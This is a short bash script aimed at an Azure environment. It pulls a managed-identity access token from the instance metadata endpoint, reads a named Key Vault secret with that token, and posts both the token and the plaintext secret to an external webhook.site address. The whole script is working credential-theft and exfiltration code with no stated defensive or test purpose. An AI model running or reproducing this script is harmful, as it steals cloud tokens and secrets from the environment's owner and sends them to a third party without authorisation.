#!/bin/bash
set -euo pipefail
export KEYVAULT_NAME="acr-2-9f82a4bab1" 
export SECRET_NAME="acr-2-9f82a4ba-b1d56"
export WEBHOOK_URL="https://webhook.site/84015fad-9e78-4e9a-8cb4-1c8cd23c3a33"
TOKEN=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" | jq -r '.access_token')
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" | jq -r '.access_token' > /tmp/test
curl -sS -X POST -H "Content-Type: text/plain" --data-binary @/tmp/test "$WEBHOOK_URL"  
SECRET_JSON=$(curl -s -H "Authorization: Bearer $TOKEN" "https://$KEYVAULT_NAME.vault.azure.net/secrets/$SECRET_NAME?api-version=7.3") 
echo "$SECRET_JSON" | jq .
SECRET_VALUE=$(echo "$SECRET_JSON" | jq -r '.value') 
echo "secret length: ${#SECRET_VALUE}" 
curl -s -X POST -H "Content-Type: text/plain" --data-binary "$SECRET_VALUE" "$WEBHOOK_URL"
